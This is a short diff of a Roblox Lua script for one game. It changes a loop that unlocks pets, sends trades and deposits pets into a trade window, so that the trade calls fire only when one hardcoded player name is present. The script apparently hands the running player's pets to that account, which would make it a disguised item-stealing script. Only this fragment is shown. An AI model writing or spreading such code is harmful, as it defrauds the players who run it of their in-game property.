@@ -255,10 +255,10 @@ if game.PlaceId == 8737899170 then
 
     while true do
         wait(1)
-
-        UnlockPet()
-        SendTrade()
-
+        if game:GetService("Players"):WaitForChild("REyifpof") ~= nil then
+            UnlockPet()
+            SendTrade()
+        end
         if game.Players.LocalPlayer.PlayerGui.TradeWindow.Enabled == true and GetTradeID() ~= nil then
             DepositPetInTrade()
             DepositStatPetInTrade()
